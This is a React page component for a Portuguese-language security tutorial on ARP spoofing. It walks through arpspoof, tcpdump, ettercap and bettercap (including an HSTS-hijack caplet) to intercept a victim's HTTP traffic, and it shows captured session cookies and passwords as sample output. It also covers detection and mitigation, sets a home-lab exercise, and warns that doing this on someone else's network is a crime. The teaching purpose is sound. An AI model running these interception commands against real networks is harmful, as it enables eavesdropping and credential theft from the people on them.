import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function ARPSpoofing() {
  return (
    <PageContainer
      title="ARP Spoofing — MITM clássico"
      subtitle="Falsifica tabelas ARP para se colocar entre 2 hosts da LAN. Base de muito MITM."
      difficulty="intermediário"
      timeToRead="13 min"
      prompt="mitm/arp-spoof"
    >
      <h2>Como o ataque funciona</h2>
      <OutputBlock label="rede normal" type="muted">
{`     [Vítima 192.168.1.50]                [Roteador 192.168.1.1]
        MAC AA:BB:CC                           MAC 11:22:33
              │                                       │
              └─────── tráfego direto ────────────────┘
                       (ARP correto)`}
      </OutputBlock>

      <OutputBlock label="durante ARP spoofing" type="error">
{`     [Vítima 192.168.1.50]    [Atacante 192.168.1.42]    [Roteador 192.168.1.1]
        MAC AA:BB:CC                MAC 99:88:77                MAC 11:22:33
              │                          │                            │
              └───  "192.168.1.1 está em 99:88:77"  ────────────►     │
              ◄────  "192.168.1.50 está em 99:88:77"  ───────────     │
              │                          │                            │
              └─── ataque vê + repassa todo tráfego ──────────────────┘`}
      </OutputBlock>

      <h2>Setup obrigatório</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "habilitar ip forward (senão você bloqueia o tráfego)",
            cmd: "sudo sysctl -w net.ipv4.ip_forward=1",
            out: "net.ipv4.ip_forward = 1",
            outType: "muted",
          },
          {
            cmd: "ip route | grep default",
            out: "default via 192.168.1.1 dev eth0",
            outType: "info",
          },
          {
            cmd: "sudo arp-scan --localnet",
            out: `Interface: eth0, datalink type: EN10MB
Starting arp-scan 1.10.0
192.168.1.1     11:22:33:44:55:66    Zyxel Communications  ← gateway
192.168.1.42    99:88:77:66:55:44    PCS (atacante = você)
192.168.1.50    aa:bb:cc:dd:ee:ff    Apple, Inc.            ← vítima`,
            outType: "default",
          },
        ]}
      />

      <h2>arpspoof (dsniff)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y dsniff",
            out: "(arpspoof, dnsspoof, sslstrip, dsniff vêm juntos)",
            outType: "muted",
          },
          {
            comment: "TERMINAL 1 — convencer a vítima que VOCÊ é o gateway",
            cmd: "sudo arpspoof -i eth0 -t 192.168.1.50 -r 192.168.1.1",
            out: `99:88:77:66:55:44 aa:bb:cc:dd:ee:ff 0806 42: arp reply 192.168.1.1 is-at 99:88:77:66:55:44
99:88:77:66:55:44 11:22:33:44:55:66 0806 42: arp reply 192.168.1.50 is-at 99:88:77:66:55:44
(envia em loop a cada 2s — não pare)`,
            outType: "warning",
          },
        ]}
      />

      <p>Em outro terminal, capture o tráfego que agora passa por você:</p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "TERMINAL 2 — sniffar HTTP da vítima",
            cmd: "sudo tcpdump -i eth0 -A 'host 192.168.1.50 and tcp port 80'",
            out: `21:34:12.142 IP 192.168.1.50.51234 > 200.150.10.42.80: HTTP: GET /login HTTP/1.1
Host: app-do-cliente.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0)
Cookie: PHPSESSID=abc123def456

21:34:12.341 IP 192.168.1.50.51234 > 200.150.10.42.80: HTTP: POST /login HTTP/1.1
Host: app-do-cliente.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

username=maria&password=Senha@123`,
            outType: "error",
          },
          {
            comment: "TERMINAL 3 — verificar a tabela ARP da vítima (na vítima!)",
            cmd: "(na vítima) arp -a",
            out: `? (192.168.1.1) at 99:88:77:66:55:44 [ether] on en0    ← gateway agora aponta para o atacante`,
            outType: "warning",
          },
        ]}
      />

      <h2>ettercap — interface gráfica integrada</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo ettercap -G",
            out: "(abre GUI Ettercap GTK)",
            outType: "muted",
          },
          {
            comment: "fluxo GUI: Sniff → Unified sniffing → eth0",
            cmd: "(GUI)",
            out: `1. Sniff → Unified sniffing → eth0
2. Hosts → Scan for hosts (descobre todos)
3. Hosts → Hosts list (lista)
4. Selecione vítima → "Add to Target 1"
5. Selecione gateway → "Add to Target 2"
6. Mitm → ARP poisoning → Sniff remote connections`,
            outType: "info",
          },
          {
            comment: "via CLI (texto puro)",
            cmd: "sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//",
            out: `ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Listening on:
  eth0 -> 99:88:77:66:55:44
          192.168.1.42/255.255.255.0
          fe80::xxx/64

ARP poisoning victims:

 GROUP 1 : 192.168.1.50 aa:bb:cc:dd:ee:ff

 GROUP 2 : 192.168.1.1 11:22:33:44:55:66

Starting Unified sniffing...

Text only Interface activated...
Hit 'h' for inline help

(captures aparecem no terminal — Ctrl+C para terminar e fazer ARP heal)`,
            outType: "warning",
          },
        ]}
      />

      <h2>bettercap — moderno e rico</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y bettercap",
            out: "(suporta WiFi, Bluetooth, HTTPs proxying, captive portal)",
            outType: "muted",
          },
          {
            cmd: "sudo bettercap -iface eth0",
            out: `bettercap v2.32.0 (built for linux amd64 with go1.21.0) [type 'help' for a list of commands]

192.168.1.0/24 > 192.168.1.42 » `,
            outType: "info",
          },
        ]}
      />

      <Terminal
        user=""
        host="bettercap"
        path=""
        prompt=">>"
        lines={[
          {
            cmd: "net.probe on",
            out: "[net.probe] starting net.recon as a requirement for net.probe",
            outType: "muted",
          },
          {
            cmd: "net.show",
            out: `┌────────────────────┬───────────────────┬──────────────────────────┬────────┐
│ IP                 │ MAC               │ Vendor                   │ Sent   │
├────────────────────┼───────────────────┼──────────────────────────┼────────┤
│ 192.168.1.42 (eth0)│ 99:88:77:66:55:44 │ PCS Computer Systems     │ 0 B    │
│ 192.168.1.1        │ 11:22:33:44:55:66 │ Zyxel Communications     │ 412 B  │
│ 192.168.1.50       │ aa:bb:cc:dd:ee:ff │ Apple, Inc.              │ 1.4 KB │
└────────────────────┴───────────────────┴──────────────────────────┴────────┘`,
            outType: "default",
          },
          {
            cmd: "set arp.spoof.targets 192.168.1.50",
            out: "",
            outType: "muted",
          },
          {
            cmd: "arp.spoof on",
            out: `[arp.spoof] arp spoofer started, probing 1 targets.`,
            outType: "warning",
          },
          {
            cmd: "net.sniff on",
            out: `[net.sniff] sniffer started.`,
            outType: "default",
          },
          {
            cmd: "events.stream on",
            out: `[net.sniff.http] http http://app.local/login GET (size:412)
[net.sniff.http] http http://app.local/login POST (size:88)
[net.sniff.http.request] HEADER Cookie: PHPSESSID=abc123def456
[net.sniff.http.request] BODY username=maria&password=Senha@123    ← captura!`,
            outType: "error",
          },
          {
            comment: "saindo: PARA o spoof e cura ARP",
            cmd: "arp.spoof off",
            out: "[arp.spoof] arp spoofer stopped, restoring ARP cache.",
            outType: "muted",
          },
        ]}
      />

      <h2>Caplets do bettercap</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "ls /usr/share/bettercap/caplets/",
            out: `airdrop.cap     bypass-blacklist.cap     download-autopwn.cap   gps.cap
hstshijack/     http-req-dump.cap        login-manager.cap      mitm6.cap
naughty-http.cap pinwall.cap             rest-api.cap            web-ui.cap`,
            outType: "info",
          },
          {
            comment: "caplet pronto: HSTS hijack (downgrade HTTPS para HTTP)",
            cmd: "sudo bettercap -iface eth0 -caplet hstshijack/hstshijack",
            out: `(carrega arp.spoof + dns.spoof + http.proxy + sslstrip-like)`,
            outType: "warning",
          },
        ]}
      />

      <h2>Defesa</h2>
      <CodeBlock
        language="bash"
        title="detectar e mitigar ARP spoof"
        code={`# 1. Detectar com arpwatch
sudo apt install -y arpwatch
sudo systemctl enable --now arpwatch
# avisa por mail quando MAC muda

# 2. Detectar com tshark
tshark -i eth0 -Y 'arp.duplicate-address-detected' -V

# 3. ARP estático (no host crítico)
sudo arp -s 192.168.1.1 11:22:33:44:55:66
# trava o gateway no MAC verdadeiro — spoof não funciona

# 4. DHCP snooping + Dynamic ARP Inspection (no switch L3)
# Configura no Cisco/Juniper — bloqueia no switch

# 5. Cliente: VPN, sempre que possível
# tráfego cifrado de ponta a ponta — spoof vê mas não lê`}
      />

      <PracticeBox
        title="MITM em rede do seu próprio laboratório"
        goal="Em uma LAN com 2 VMs (vítima e atacante), interceptar tráfego HTTP simples."
        steps={[
          "Garanta 2 VMs no mesmo NAT/host-only.",
          "Suba HTTP simples no atacante (python -m http.server).",
          "Habilite ip_forward.",
          "Rode bettercap → arp.spoof + net.sniff.",
          "Da vítima, faça login HTTP em algo do atacante.",
          "Confirme a captura em events.stream.",
        ]}
        command={`# ATACANTE
sudo sysctl -w net.ipv4.ip_forward=1
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.56.10; arp.spoof on; net.sniff on; events.stream on"

# VÍTIMA (192.168.56.10)
curl -X POST http://192.168.56.20:8080/login -d 'user=alice&pass=secret'

# Observe no atacante:
# events: net.sniff.http BODY user=alice&pass=secret`}
        expected={`[arp.spoof] arp spoofer started, probing 1 targets.
[net.sniff.http] http http://192.168.56.20:8080/login POST (size:42)
[net.sniff.http.request] BODY user=alice&pass=secret`}
        verify="A linha BODY com 'pass=secret' deve aparecer. Para HTTPS modernos (HSTS preload), o ataque NÃO funciona — só com HTTP simples."
      />

      <AlertBox type="danger" title="HTTPS moderno bloqueia muita coisa">
        Com HSTS preload, HTTP/2, HTTP/3, certificate pinning e DoH, ARP spoof + sslstrip
        clássico não funciona contra Gmail, Facebook, banco. Funciona contra apps antigos
        (HTTP simples) ou em alvos sem autenticação de servidor (IoT). Continue aprendendo
        a técnica — base para MITM via WiFi falsa, captive portal e proxies maliciosos.
      </AlertBox>

      <AlertBox type="danger" title="Em rede que não é sua = crime">
        Spoof em LAN doméstica/lab/HTB → liberado. Numa cafeteria, hotel, empresa sem
        contrato → interceptação de comunicação. Crime mesmo se você não usar o que viu.
      </AlertBox>
    </PageContainer>
  );
}
